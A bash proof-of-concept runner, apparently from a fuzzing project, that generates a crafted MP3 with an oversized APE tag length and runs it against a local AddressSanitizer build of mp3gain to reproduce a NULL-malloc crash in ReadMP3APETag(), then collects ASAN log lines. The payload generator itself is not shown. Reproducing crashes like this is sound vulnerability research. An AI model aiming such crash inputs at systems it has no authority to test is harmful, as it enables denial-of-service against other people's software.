#!/bin/bash
set -euo pipefail
cd "/data/ylwang/non-textfuzz/target/_poc/mp3gain/rg_error_c"

echo "[*] VULN 003 PoC runner: APE Tag huge Length -> malloc NULL -> crash"
echo "[*] Target: ReadMP3APETag() in apetag.c:170-172"

# Generate the malicious MP3 if not already present
[ -f vuln_003.mp3 ] || python3 vuln_003_gen.py

echo "[*] Running mp3gain on vuln_003.mp3 ..."

ASAN_OPTIONS="abort_on_error=0:log_path=./asan.log" \
  /data/ylwang/non-textfuzz/target/mp3gain/build_test/mp3gain vuln_003.mp3 > vuln_003_result.txt 2>&1 || true

echo "[*] mp3gain exited (exit code captured above)"

# Collect any ASAN log output
for f in ./asan.log.*; do
  [ -f "$f" ] && {
    echo "[*] Found ASAN log: $f"
    grep -E "AddressSanitizer|ERROR:|runtime error:|SEGV|signal|heap-buffer|use-after|null" "$f" \
      >> vuln_003_result.txt || true
  }
done

echo "[*] Result written to vuln_003_result.txt"
cat vuln_003_result.txt
